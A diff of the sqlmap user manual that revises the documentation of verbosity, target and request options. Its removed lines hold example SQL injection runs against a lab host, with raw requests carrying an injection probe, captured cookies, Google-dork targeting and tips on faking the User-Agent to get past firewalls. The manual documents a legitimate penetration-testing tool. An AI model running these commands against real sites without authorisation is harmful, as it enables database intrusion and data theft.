-[hh:mm:59] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:59] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:59] [INFO] GET parameter 'id' is dynamic
-[hh:mm:59] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:59] [INFO] testing unescaped numeric injection on GET parameter 'id'
-[hh:mm:59] [INFO] confirming unescaped numeric injection on GET parameter 'id'
-[hh:mm:59] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[hh:mm:59] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:59] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:59] [INFO] testing MySQL
-[hh:mm:59] [INFO] confirming MySQL
-[hh:mm:59] [INFO] retrieved: 0
-[hh:mm:59] [INFO] the back-end DBMS is MySQL
-
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
-</verb></tscreen>
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>2</bf>):
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 2
-
-[hh:mm:22] [DEBUG] initializing the configuration
-[hh:mm:22] [DEBUG] initializing the knowledge base
-[hh:mm:22] [DEBUG] cleaning up configuration parameters
-[hh:mm:22] [DEBUG] setting the HTTP timeout
-[hh:mm:22] [DEBUG] setting the HTTP method to GET
-[hh:mm:22] [DEBUG] creating HTTP requests opener object
-[hh:mm:22] [DEBUG] parsing XML queries file
-[hh:mm:22] [INFO] using '/home/inquis/sqlmap/output/192.168.136.131/session' as session file
-[hh:mm:22] [INFO] testing connection to the target url
-[hh:mm:22] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:23] [INFO] url is stable
-[hh:mm:23] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:23] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:23] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:23] [DEBUG] setting match ratio to 0.743
-[hh:mm:23] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:23] [INFO] GET parameter 'id' is dynamic
-[hh:mm:23] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:23] [INFO] testing unescaped numeric injection on GET parameter 'id'
-[hh:mm:23] [INFO] confirming unescaped numeric injection on GET parameter 'id'
-[hh:mm:23] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[hh:mm:23] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:23] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:23] [INFO] testing MySQL
-[hh:mm:23] [INFO] confirming MySQL
-[hh:mm:23] [DEBUG] query: SELECT 2 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:23] [INFO] retrieved: 2
-[hh:mm:23] [DEBUG] performed 7 queries in 0 seconds
-[hh:mm:23] [INFO] the back-end DBMS is MySQL
-
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
-</verb></tscreen>
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>3</bf>):
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 3
-
-[hh:mm:53] [DEBUG] initializing the configuration
-[hh:mm:53] [DEBUG] initializing the knowledge base
-[hh:mm:53] [DEBUG] cleaning up configuration parameters
-[hh:mm:53] [DEBUG] setting the HTTP timeout
-[hh:mm:53] [DEBUG] setting the HTTP method to GET
-[hh:mm:53] [DEBUG] creating HTTP requests opener object
-[hh:mm:53] [DEBUG] parsing XML queries file
-[hh:mm:53] [INFO] using '/home/inquis/sqlmap/output/192.168.136.131/session' as session file
-[hh:mm:53] [INFO] testing connection to the target url
-[hh:mm:53] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-User-agent: sqlmap/0.8
-Connection: close
-[...]
-[hh:mm:54] [INFO] testing MySQL
-[hh:mm:54] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1%20AND%20CONNECTION_ID%28%29=CONNECTION_ID%28%29%20AND%202385=2385 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-User-agent: sqlmap/0.8
-Connection: close
-[...]
-</verb></tscreen>
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>4</bf>):
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 4
-
-[...]
-[hh:mm:20] [DEBUG] initializing the configuration
-[hh:mm:20] [DEBUG] initializing the knowledge base
-[hh:mm:20] [DEBUG] cleaning up configuration parameters
-[hh:mm:20] [DEBUG] setting the HTTP timeout
-[hh:mm:20] [DEBUG] setting the HTTP method to GET
-[hh:mm:20] [DEBUG] creating HTTP requests opener object
-[hh:mm:20] [DEBUG] parsing XML queries file
-[hh:mm:20] [INFO] using '/home/inquis/sqlmap/output/192.168.136.131/session' as session file
-[hh:mm:20] [INFO] testing connection to the target url
-[hh:mm:20] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-User-agent: sqlmap/0.8
-Connection: close
-
-[hh:mm:20] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Sat, 20 Feb 2010 17:43:00 GMT
-Server: Apache/2.2.9
-X-Powered-By: PHP/5.2.6-1+lenny4
-Vary: Accept-Encoding
-Content-Length: 127
-Connection: close
-Content-Type: text/html
-[...]
-</verb></tscreen>
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>5</bf>):
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 5
-
-[hh:mm:47] [DEBUG] initializing the configuration
-[hh:mm:47] [DEBUG] initializing the knowledge base
-[hh:mm:47] [DEBUG] cleaning up configuration parameters
-[hh:mm:47] [DEBUG] setting the HTTP timeout
-[hh:mm:47] [DEBUG] setting the HTTP method to GET
-[hh:mm:47] [DEBUG] creating HTTP requests opener object
-[hh:mm:47] [DEBUG] parsing XML queries file
-[hh:mm:47] [INFO] using '/home/inquis/sqlmap/output/192.168.136.131/session' as session file
-[hh:mm:47] [INFO] testing connection to the target url
-[hh:mm:47] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-User-agent: sqlmap/0.8
-Connection: close
-
-[hh:mm:47] [TRAFFIC IN] HTTP response (OK - 200):
-Date: Sat, 20 Feb 2010 17:44:27 GMT
-Server: Apache/2.2.9
-X-Powered-By: PHP/5.2.6-1+lenny4
-Vary: Accept-Encoding
-Connection: close
-Transfer-Encoding: chunked
-Content-Type: text/html
-
-&lt;html&gt;&lt;body&gt;
-&lt;b&gt;SQL results:&lt;/b&gt;
-&lt;table border="1"&gt;
-&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;luther&lt;/td&gt;&lt;td&gt;blissett&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/body&gt;&lt;/html&gt;
-[...]
-</verb></tscreen>
+A reasonable level of verbosity to further understand what sqlmap is doing under the hood is level <bf>2</bf>, primarily for the detection phase and the take-over functionalities. Whereas if you want to make sure you know which SQL payloads the tools sends, level <bf>3</bf> is your best choice. In order to further debug potential bugs or unexpected behaviours, we recommend you to set the verbosity to level <bf>4</bf> or above. This level is recommended to be used when you feed the developers with a bug report too.
 
 
 <sect1>Target
 
 <p>
 At least one of these options has to be specified to set the source to get
-target addresses from.
+target URLs from.
 
 <sect2>Target URL
 
 <p>
-Option: <tt>-u</tt> or <tt>-</tt><tt>-url</tt>
+Switch: <tt>-u</tt> or <tt>-</tt><tt>-url</tt>
 
 <p>
-To run sqlmap against a single target URL.
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"
-
-[...]
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL 5
-</verb></tscreen>
-
+Run sqlmap against a single target URL.
 
 <sect2>Parse targets from Burp or WebScarab proxy logs
 
 <p>
-Option: <tt>-l</tt>
+Switch: <tt>-l</tt>
 
 <p>
 Rather than providing a single target URL, it is possible to test and
-inject on HTTP requests proxied through <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
-or <htmlurl url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project" name="WebScarab proxy">.
-
-<p>
-Example passing to sqlmap a WebScarab proxy <tt>conversations/</tt> folder:
-
-<tscreen><verb>
-$ python sqlmap.py -l /tmp/webscarab.log/conversations/
-
-[hh:mm:43] [INFO] sqlmap parsed 27 testable requests from the targets list
-[hh:mm:43] [INFO] sqlmap got a total of 27 targets
-[hh:mm:43] [INPUT] url 1:
-GET http://192.168.136.131/phpmyadmin/navigation.php?db=test&amp;token=60747016432606019619a
-c58b3780562
-Cookie: PPA_ID=197bf44d671aeb7d3a28719a467d86c3; phpMyAdmin=366c9c9b329a98eabb4b708c2df8b
-d7d392eb151; pmaCookieVer=4; pmaPass-1=uH9%2Fz5%2FsB%2FM%3D; pmaUser-1=pInZx5iWPrA%3D; 
-pma_charset=iso-8859-1; pma_collation_connection=utf8_unicode_ci; pma_fontsize=deleted; 
-pma_lang=en-utf-8; pma_mcrypt_iv=o6Mwtqw6c0c%3D; pma_theme=deleted
-do you want to test this url? [Y/n/q] n
-[hh:mm:46] [INPUT] url 2:
-GET http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
-Cookie: PPA_ID=197bf44d671aeb7d3a28719a467d86c3
-do you want to test this url? [Y/n/q] y
-[hh:mm:49] [INFO] testing url http://192.168.136.131/sqlmap/mysql/get_int.php?id=1
-[hh:mm:49] [INFO] testing connection to the target url
-[hh:mm:49] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:50] [INFO] url is stable
-[hh:mm:50] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:50] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:50] [INFO] testing if Cookie parameter 'PPA_ID' is dynamic
-[hh:mm:50] [WARNING] Cookie parameter 'PPA_ID' is not dynamic
-[hh:mm:50] [INFO] testing if GET parameter 'id' is dynamic
-[hh:mm:50] [INFO] confirming that GET parameter 'id' is dynamic
-[hh:mm:50] [INFO] GET parameter 'id' is dynamic
-[hh:mm:50] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
-[hh:mm:50] [INFO] testing unescaped numeric injection on GET parameter 'id'
-[hh:mm:50] [INFO] confirming unescaped numeric injection on GET parameter 'id'
-[hh:mm:50] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[hh:mm:50] [INPUT] do you want to exploit this SQL injection? [Y/n] y
-[hh:mm:29] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:29] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:29] [INFO] testing MySQL
-[hh:mm:29] [INFO] retrieved: 99
-[hh:mm:29] [INFO] confirming MySQL
-[hh:mm:29] [INFO] retrieved: 1
-[hh:mm:29] [INFO] retrieved: 9
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS: MySQL >= 5.0.0
-[...]
-</verb></tscreen>
-
+inject on HTTP requests proxied through <htmlurl url="http://portswigger.net/suite/"
+name="Burp proxy"> or <htmlurl
+url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project"
+name="WebScarab proxy">.
 
 <sect2>Load HTTP request from a file
 
 <p>
-Option: <tt>-r</tt>
+Switch: <tt>-r</tt>
 
 <p>
-One of the possibilities of sqlmap is loading of complete HTTP
-request packet stored in textual file. That way you can skip usage of
-bunch of other options.
+One of the possibilities of sqlmap is loading of complete HTTP request
+stored in textual file. That way you can skip usage of bunch of other
+options (e.g. setting of cookies, POSTed data, etc).
 
 <p>
 Sample content of a HTTP request file:
@@ -1232,40 +1001,10 @@ User-Agent: Mozilla/4.0
 id=1
 </verb></tscreen>
 
-<p>
-Example usage:
-
-<tscreen><verb>
-$ python sqlmap.py -r request.txt
-
-[...]
-[hh:mm:27] [INFO] parsing HTTP request from 'request.txt'
-[...]
-[hh:mm:21] [INFO] testing if POST parameter 'id' is dynamic
-[hh:mm:22] [INFO] confirming that POST parameter 'id' is dynamic
-[hh:mm:22] [INFO] POST parameter 'id' is dynamic
-[hh:mm:22] [INFO] testing sql injection on POST parameter 'id' with 0 parenthesis
-[hh:mm:22] [INFO] testing unescaped numeric injection on POST parameter 'id'
-[hh:mm:22] [INFO] confirming unescaped numeric injection on POST parameter 'id'
-[hh:mm:22] [INFO] POST parameter 'id' is unescaped numeric injectable with 0 parenthesis
-[hh:mm:22] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:22] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:22] [INFO] testing for parenthesis on injectable parameter
-[hh:mm:22] [INFO] the injectable parameter requires 0 parenthesis
-[hh:mm:22] [INFO] testing MySQL
-[hh:mm:22] [INFO] confirming MySQL
-[hh:mm:22] [INFO] retrieved: 3
-[hh:mm:22] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
-web application technology: PHP 5.2.4, Apache 2.2.8
-back-end DBMS: MySQL >= 5.0.0
-</verb></tscreen>
-
-
 <sect2>Process Google dork results as target addresses
 
 <p>
-Option: <tt>-g</tt>
+Switch: <tt>-g</tt>
 
 <p>
 It is also possible to test and inject on <tt>GET</tt> parameters on the
@@ -1274,8 +1013,9 @@ results of your Google dork.
 <p>
 This option makes sqlmap negotiate with the search engine its session
 cookie to be able to perform a search, then sqlmap will retrieve Google
-first 100 results for the Google dork expression with <tt>GET</tt> parameters
-asking you if you want to test and inject on each possible affected URL.
+first 100 results for the Google dork expression with <tt>GET</tt>
+parameters asking you if you want to test and inject on each possible
+affected URL.
 
 <p>
 Example of Google dorking with expression <tt>site:yourdomain.com
@@ -1298,15 +1038,6 @@ url? [y/N/q] n
 GET http://thirdlevel.yourdomain.com/news/example3.php?today=483, do you 
 want to test this url? [y/N/q] y
 [hh:mm:44] [INFO] testing url http://thirdlevel.yourdomain.com/news/example3.php?today=483
-[hh:mm:45] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:49] [INFO] url is stable
-[hh:mm:50] [INFO] testing if GET parameter 'today' is dynamic
-[hh:mm:51] [INFO] confirming that GET parameter 'today' is dynamic
-[hh:mm:53] [INFO] GET parameter 'today' is dynamic
-[hh:mm:54] [INFO] testing sql injection on GET parameter 'today'
-[hh:mm:56] [INFO] testing numeric/unescaped injection on GET parameter 'today'
-[hh:mm:57] [INFO] confirming numeric/unescaped injection on GET parameter 'today'
-[hh:mm:58] [INFO] GET parameter 'today' is numeric/unescaped injectable
 [...]
 </verb></tscreen>
 
@@ -1314,22 +1045,11 @@ want to test this url? [y/N/q] y
 <sect2>Load options from a configuration INI file
 
 <p>
-Option: <tt>-c</tt>
+Switch: <tt>-c</tt>
 
 <p>
 It is possible to pass user's options from a configuration INI file, an
 example is <tt>sqlmap.conf</tt>.
-
-<p>
-Example usage:
-
-<tscreen><verb>
-$ python sqlmap.py -c "sqlmap.conf"
-
-[hh:mm:42] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
-[hh:mm:42] [WARNING] GET parameter 'cat' is not dynamic
-back-end DBMS:  MySQL >= 5.0.0
-</verb></tscreen>
 
 <p>
 Note that if you also provide other options from command line, those are
@@ -1340,52 +1060,24 @@ the provided configuration file.
 <sect1>Request
 
 <p>
-These options can be used to specify how to connect to the target
-application.
+These options can be used to specify how to connect to the target url.
 
 <sect2>HTTP method: <tt>GET</tt> or <tt>POST</tt>
 
 <p>
-Options: <tt>-</tt><tt>-method</tt> and <tt>-</tt><tt>-data</tt>
+Option: <tt>-</tt><tt>-data</tt>
 
 <p>
 By default the HTTP method used to perform HTTP requests is <tt>GET</tt>,
-but you can change it to <tt>POST</tt> and provide the data to be sent
-through <tt>POST</tt> request. Such data, being those parameters, are
-tested for SQL injection like the <tt>GET</tt> parameters.
-
-<p>
-Example on an <bf>Oracle XE 10.2.0.1</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/post_int.php" --method POST \
-  --data "id=1"
-
-[hh:mm:53] [INFO] testing connection to the target url
-[hh:mm:53] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:54] [INFO] url is stable
-[hh:mm:54] [INFO] testing if POST parameter 'id' is dynamic
-[hh:mm:54] [INFO] confirming that POST parameter 'id' is dynamic
-[hh:mm:54] [INFO] POST parameter 'id' is dynamic
-[hh:mm:54] [INFO] testing sql injection on POST parameter 'id'
-[hh:mm:54] [INFO] testing numeric/unescaped injection on POST parameter 'id'
-[hh:mm:54] [INFO] confirming numeric/unescaped injection on POST parameter 'id'
-[hh:mm:54] [INFO] POST parameter 'id' is numeric/unescaped injectable
-[...]
-[hh:mm:54] [INFO] testing Oracle
-[hh:mm:54] [INFO] retrieved: 9
-[hh:mm:54] [INFO] confirming Oracle
-[hh:mm:54] [INFO] retrieved: 10.2.0.1.0
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS:    Oracle
-</verb></tscreen>
+but you can implicitly change it to <tt>POST</tt> by providing the data to
+be sent in the <tt>POST</tt> requests. Such data, being those parameters,
+are tested for SQL injection as well as the <tt>GET</tt> parameters.
 
 
 <sect2>HTTP <tt>Cookie</tt> header
 
 <p>
-Options: <tt>-</tt><tt>-cookie</tt>, <tt>-</tt><tt>-cookie-urlencode</tt> and <tt>-</tt><tt>-drop-set-cookie</tt>
+Switches: <tt>-</tt><tt>-cookie</tt>, <tt>-</tt><tt>-cookie-urlencode</tt> and <tt>-</tt><tt>-drop-set-cookie</tt>
 
 <p>
 This feature can be useful in two scenarios:
@@ -1393,191 +1085,80 @@ This feature can be useful in two scenarios:
 <itemize>
 <item>The web application requires authentication based upon cookies and
 you have such data.
-<item>You want to test for and exploit SQL injection on such header
-values.
+<item>You want to detect and exploit SQL injection on such header values.
 </itemize>
 
 <p>
-The steps to go through in the second scenario are the following:
+Either reason brings you to need to send cookies with sqlmap requests, the
+steps to go through in the second scenario are the following:
 
 <itemize>
 <item>On Firefox web browser login on the web authentication form while
 dumping URL requests with <htmlurl url="http://tamperdata.mozdev.org/"
-name="TamperData"> browser's extension.
+name="TamperData"> browser's extension or by passing through a HTTP proxy
+like Burp.
 <item>In the horizontal box of the extension select your authentication
 transaction then in the left box on the bottom click with the right button
 on the <tt>Cookie</tt> value, then click on <tt>Copy</tt> to save its
 value to the clipboard.
-<item>Go back to your shell and run sqlmap.
+<item>Go back to your shell and run sqlmap by pasting your clipboard to
+the argument of the <tt>-</tt><tt>-cookie</tt> switch.
 </itemize>
 
 <p>
-Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/cookie_int.php" --cookie \
-  "id=1" -v 1
-
-[hh:mm:37] [INFO] testing connection to the target url
-[hh:mm:37] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:38] [INFO] url is stable
-[hh:mm:38] [INFO] testing if Cookie parameter 'id' is dynamic
-[hh:mm:38] [INFO] confirming that Cookie parameter 'id' is dynamic
-[hh:mm:38] [INFO] Cookie parameter 'id' is dynamic
-[hh:mm:38] [INFO] testing sql injection on Cookie parameter 'id'
-[hh:mm:38] [INFO] testing numeric/unescaped injection on Cookie parameter 'id'
-[hh:mm:38] [INFO] confirming numeric/unescaped injection on Cookie parameter 'id'
-[hh:mm:38] [INFO] Cookie parameter 'id' is numeric/unescaped injectable
-[...]
-</verb></tscreen>
-
-<p>
 Note that the HTTP <tt>Cookie</tt> header values are usually separated by
-a <tt>;</tt> character, <bf>not</bf> by an <tt>&amp;</tt>.
+a <tt>;</tt> character, <bf>not</bf> by an <tt>&amp;</tt>. sqlmap can
+recognize these as separate sets of <tt>parameter=value</tt> too, as well
+as GET and POST parameters.
 
 <p>
-If the web application at first HTTP response has a <tt>Set-Cookie</tt>
-header, sqlmap will automatically use it's value in all further HTTP
-requests as the <tt>Cookie</tt> header. sqlmap will also automatically
-test that value for SQL injection, except if you run it with
-<tt>--drop-set-cookie</tt> option.
+If the web application responds with <tt>Set-Cookie</tt> headers at any
+time during the communication, sqlmap will automatically use its value in
+all further HTTP requests as the <tt>Cookie</tt> header. sqlmap will also
+automatically test those values for SQL injection, except if you run it
+with <tt>--drop-set-cookie</tt> option. In the latter case, sqlmap will
+ignore any coming <tt>Set-Cookie</tt> header.
 
 <p>
-Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.128/sqlmap/get_str.asp?name=luther" -v 3
-
-[...]
-[hh:mm:39] [INFO] testing connection to the target url
-[hh:mm:39] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/get_str.asp?name=luther HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.128:80
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Cookie: ASPSESSIONIDSABTRCAS=HPCBGONANJBGFJFHGOKDMCGJ
-Connection: close
-
-[...]
-[hh:mm:40] [INFO] url is stable
-[...]
-[hh:mm:40] [INFO] testing if Cookie parameter 'ASPSESSIONIDSABTRCAS' is dynamic
-[hh:mm:40] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/get_str.asp?name=luther HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.128:80
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-Cookie: ASPSESSIONIDSABTRCAS=469
-User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
-Connection: close
-
-[hh:mm:40] [WARNING] Cookie parameter 'ASPSESSIONIDSABTRCAS' is not dynamic
-[...]
-</verb></tscreen>
+Vice versa, if you provide a HTTP <tt>Cookie</tt> header with
+<tt>--cookie</tt> switch and the target URL sends an HTTP <tt>Set-Cookie</tt>
+header at any time, sqlmap will ask you which one to use for the following
+HTTP requests.
 
 <p>
-If you provide an HTTP <tt>Cookie</tt> header value and the target URL
-sends an HTTP <tt>Set-Cookie</tt> header, sqlmap asks you which one to use
-in the following HTTP requests.
+sqlmap by default <bf>does not</bf> URL encode generated cookie injections,
+but you can force it by using the <tt>-</tt><tt>-cookie-urlencode</tt>
+switch. Cookie content encoding is not declared by standard in any way, so
+it is solely the matter of web application's behaviour.
 
 <p>
-Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.128/sqlmap/get_str.asp?name=luther" --cookie "id=1"
-
-[hh:mm:51] [INPUT] you provided an HTTP Cookie header value. The target url provided its
-own Cookie within the HTTP Set-Cookie header. Do you want to continue using the HTTP cookie
-values that you provided? [Y/n] 
-</verb></tscreen>
-
-<p>
-sqlmap by default doesn't URL encode generated cookie injections, but you can force it by 
-using the <tt>-</tt><tt>-cookie-urlencode</tt> flag. Cookie content encoding is not declared
-by standard in any way, so it's solely the matter of web application's behaviour.
+Note that also the HTTP <tt>Cookie</tt> header is tested against SQL
+injection if the <tt>--level</tt> is set to <bf>2</bf> or above. See below
+for details.
 
 
 <sect2>HTTP <tt>User-Agent</tt> header
 
 <p>
-Options: <tt>-</tt><tt>-user-agent</tt> and <tt>-a</tt>
+Switches: <tt>-</tt><tt>-user-agent</tt> and <tt>--random-agent</tt>
 
 <p>
-By default sqlmap perform HTTP requests providing the following HTTP
-<tt>User-Agent</tt> header value:
+By default sqlmap performs HTTP requests with the following <tt>User-Agent</tt>
+header value:
 
 <tscreen><verb>
-sqlmap/0.8 (http://sqlmap.sourceforge.net)
+sqlmap/0.9 (http://sqlmap.sourceforge.net)
 </verb></tscreen>
 
 <p>
-It is possible to fake it with the <tt>-</tt><tt>-user-agent</tt> option.
+However, it is possible to fake it with the <tt>-</tt><tt>-user-agent</tt>
+option.
 
 <p>
-Example on an <bf>Oracle XE 10.2.0.1</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" \
-  --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
-
-[...]
-[hh:mm:02] [INFO] testing connection to the target url
-[hh:mm:02] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
-Connection: close
-[...]
-</verb></tscreen>
-
-<p>
-Providing a text file, <tt>./txt/user-agents.txt</tt> or any other
-file containing a list of at least one user agent, to the <tt>-a</tt>
-option, sqlmap will randomly select a <tt>User-Agent</tt> from the file
-and use it for all HTTP requests.
-
-<p>
-Example on a <bf>MySQL 5.0.67</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 1 \
-  -a "./txt/user-agents.txt"
-
-[hh:mm:00] [DEBUG] initializing the configuration
-[hh:mm:00] [DEBUG] initializing the knowledge base
-[hh:mm:00] [DEBUG] cleaning up configuration parameters
-[hh:mm:00] [DEBUG] fetching random HTTP User-Agent header from file './txt/user-agents.txt'
-[hh:mm:00] [INFO] fetched random HTTP User-Agent header from file './txt/user-agents.txt': 
-Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98) 
-[hh:mm:00] [DEBUG] setting the HTTP method to perform HTTP requests through
-[hh:mm:00] [DEBUG] creating HTTP requests opener object
-[hh:mm:00] [DEBUG] parsing XML queries file
-[hh:mm:00] [INFO] testing connection to the target url
-[hh:mm:00] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.136.131
-Accept-language: en-us,en;q=0.5
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98) 
-Connection: close
-[...]
-</verb></tscreen>
-
-<p>
-Note that the HTTP <tt>User-Agent</tt> header is tested against SQL
-injection also if you do not overwrite the default sqlmap HTTP
-<tt>User-Agent</tt> header value.
+Moreover, by providing the <tt>--random-agent</tt> switch, sqlmap will
+randomly select a <tt>User-Agent</tt> from the
+<tt>./txt/user-agents.txt</tt> textual file and use it for all HTTP
+requests within the session.
 
 <p>
 Some sites perform a server-side check on the HTTP <tt>User-Agent</tt>
@@ -1587,419 +1168,324 @@ application firewall or similar intrusion prevention system. In this case
 sqlmap will show you a message as follows:
 
 <tscreen><verb>
-[hh:mm:20] [ERROR] the target url responded with an unknown HTTP status code, try
-to force the HTTP User-Agent header with option --user-agent or -a
+[hh:mm:20] [ERROR] the target url responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --user-agent or --random-agent
 </verb></tscreen>
+
+<p>
+Note that also the HTTP <tt>User-Agent</tt> header is tested against SQL
+injection if the <tt>--level</tt> is set to <bf>3</bf> or above. See below
+for details.
 
 
 <sect2>HTTP <tt>Referer</tt> header
 
 <p>
-Option: <tt>-</tt><tt>-referer</tt>
+Switch: <tt>-</tt><tt>-referer</tt>
 
 <p>
 It is possible to fake the HTTP <tt>Referer</tt> header value with this
-option. By default no HTTP <tt>Referer</tt> header is sent in HTTP
-requests.
+option. By default <bf>no</bf> HTTP <tt>Referer</tt> header is sent in
+HTTP requests.
 
 <p>
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --referer \
-  "http://www.google.com" -v 3
-
-[...]
